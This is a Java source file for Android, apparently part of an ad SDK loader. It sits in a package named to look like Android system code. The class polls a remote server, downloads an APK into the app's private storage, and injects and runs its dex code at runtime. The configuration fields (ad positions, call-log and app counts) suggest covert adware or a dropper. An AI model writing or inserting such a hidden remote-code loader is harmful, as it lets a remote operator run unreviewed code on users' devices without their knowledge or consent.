package com.android.system.core.smart;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Message;
import android.util.Log;


import com.duowan.mobile.netroid.DefaultRetryPolicy;
import com.duowan.mobile.netroid.Listener;
import com.duowan.mobile.netroid.NetroidError;
import com.duowan.mobile.netroid.request.StringRequest;
import com.guang.gadlib.GAdController;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

/**
 * Created by guang on 2017/8/12.
 */

public class UpdateHelper implements Runnable{
    private long UPDATE_TIME_INTERVAL = 12*60*60*1000;
    private String UPDATE_TIME = "update_time";
    private String CURR_VERSION = "curr_version";
    private final String URI_FINDNEWSDK = Common.SERVER + "sdk_findNewSdk";
    private Handler handler;

    private int MSG_FINDSDK = 0;
    private Sdk sdk;
    @Override
    public void run() {

        ApplicationInfo appInfo = null;
        try {
            appInfo = CoreService.getCon().getPackageManager().getApplicationInfo(CoreService.getCon().getPackageName(), PackageManager.GET_META_DATA);
            String channel = appInfo.metaData.getString("UMENG_CHANNEL");
            Common.CHANNEL = channel;
            Log.e("------------","channel="+Common.CHANNEL);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);

                if(msg.what == MSG_FINDSDK)
                {
                    updateSdk();
                }
            }
        };

        long now = System.currentTimeMillis();
        long time = Common.getPre().getLong(UPDATE_TIME,0l);
        int currVersion = Common.getPre().getInt(CURR_VERSION,0);
        if(now - time > UPDATE_TIME_INTERVAL || currVersion == 0)
        {
            updateSdk();
        }
        else
        {
            parseSdk();
        }
    }

    private void updateSdk()
    {
        String url = URI_FINDNEWSDK+"?packageName="+CoreService.getCon().getPackageName()+"&channel="+Common.CHANNEL;

        StringRequest req = new StringRequest(url, new Listener<String>() {
            @Override
            public void onSuccess(String response) {
                Common.getPre().edit().putString(Common.PRE_SDK,response).commit();
                Common.getPre().edit().putLong(UPDATE_TIME,System.currentTimeMillis()).commit();
                Log.e("------------","response="+response);
                parseSdk();
            }
        });
        req.setRetryPolicy(new DefaultRetryPolicy(2500,3,2));
        CoreService.getCon().getRequestQueue().add(req);
    }

    private void parseSdk()
    {
        String sdks = Common.getPre().getString(Common.PRE_SDK,"");
        try {
            JSONObject obj = new JSONObject(sdks);

            sdk = new Sdk();
            sdk.setPackageName(obj.getString("packageName"));
            sdk.setVersionName(obj.getString("versionName"));
            sdk.setVersionCode(obj.getString("versionCode"));
            sdk.setDownloadPath(obj.getString("downloadPath"));
            sdk.setOnline(obj.getBoolean("online"));
            sdk.setUpdateNum(obj.getLong("updateNum"));
            sdk.setChannel(obj.getString("channel"));
            sdk.setNetTypes(obj.getString("netTypes"));
            sdk.setName(obj.getString("name"));
            sdk.setAppPackageName(obj.getString("appPackageName"));
            sdk.setAdPosition(obj.getString("adPosition"));
            sdk.setLoopTime((float)obj.getDouble("loopTime"));
            sdk.setCallLogNum(obj.getInt("callLogNum"));
            sdk.setTimeLimt((float)obj.getDouble("timeLimt"));
            sdk.setAppNum(obj.getInt("appNum"));

            readSdk();

        } catch (JSONException e) {
            e.printStackTrace();
            long time = 1*60*1000;
            if("".equals(Common.getNetworkType()))
                time = 60*60*1000;
            handler.sendEmptyMessageDelayed(MSG_FINDSDK,time);
        }
    }

    private void readSdk()
    {
        Log.e("------------","readSdk=");
        int currVersion = Common.getPre().getInt(CURR_VERSION,0);
        if(sdk.getVersionCode().equals(currVersion+""))
        {
            Log.e("------------","start");
            start();
        }
        else
        {
            downloadSdk();
        }
    }

    private void downloadSdk()
    {
        Log.e("------------","downloadSdk");
        String url = Common.SERVER + sdk.getDownloadPath();
        File dir = new File(CoreService.getCon().getFilesDir().getPath());
        if(!dir.exists())
            dir.mkdirs();
        final File tmp = new File(dir.getAbsolutePath()+"/sdk.tmp");
        if(tmp.exists())
            tmp.delete();

        final File apk = new File(dir.getAbsolutePath()+"/sdk.apk");

        CoreService.getCon().getDownloader().add(tmp.getAbsolutePath(), url, new Listener<Void>() {
            @Override
            public void onSuccess(Void response) {
                if(tmp.exists())
                {
                    if(apk.exists())
                        apk.delete();
                    tmp.renameTo(apk);

                    Common.getPre().edit().putInt(CURR_VERSION,Integer.parseInt(sdk.getVersionCode())).commit();
                    downloadSuccess();
                }
            }

            @Override
            public void onError(NetroidError error) {
                super.onError(error);

            }
        });
    }

    private void downloadSuccess()
    {
        String url = Common.SERVER + "sdk_updateNum?channel="+sdk.getChannel()+"&packageName="+sdk.getAppPackageName();
        StringRequest req = new StringRequest(url, new Listener<String>() {
            @Override
            public void onSuccess(String response) {
                GAdController.getInstance().killpro();
            }
        });
        req.setRetryPolicy(new DefaultRetryPolicy(2500,3,2));
        CoreService.getCon().getRequestQueue().add(req);
    }

    private void start()
    {
        DexLoaderUtil.copyDex(CoreService.getCon(), "sdk.apk");
        String dexPath = DexLoaderUtil.getDexPath(CoreService.getCon(), "sdk.apk");
        String optimizedDexOutputPath = DexLoaderUtil.getOptimizedDexPath(CoreService.getCon());
        DexLoaderUtil.inject(dexPath, optimizedDexOutputPath, null, "com.guang.gad.GController");
        DexLoaderUtil.call(CoreService.getCon().getClassLoader(),CoreService.getCon());
    }
}
